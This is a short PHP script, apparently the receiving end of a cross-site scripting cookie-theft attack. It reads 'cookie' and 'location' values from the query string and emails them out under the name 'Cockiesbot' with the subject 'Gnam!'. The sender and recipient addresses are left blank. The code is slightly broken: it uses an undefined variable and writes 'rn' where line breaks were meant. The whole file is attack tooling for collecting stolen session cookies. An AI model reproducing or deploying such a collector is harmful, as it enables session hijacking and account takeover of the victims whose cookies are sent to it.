
<?php
//mising email from & to

if( ($_GET['cookie'] == "") || ( $_GET['location'] == "")){}
else{
    $cookie = $_GET['cookie'];
    $location = $_GET['location'];

    $msg = "Cookie: " . $cookie . "rn Location: " . $location;
    $name = "Cockiesbot";
    $email_from = "";
    $email_to = "";
    $subject = "Gnam! " . $location;
    $header = "From: ". $name . " <" .$email . ">rn";

    mail($email_to, $subject, $msg, $header);
}
?>
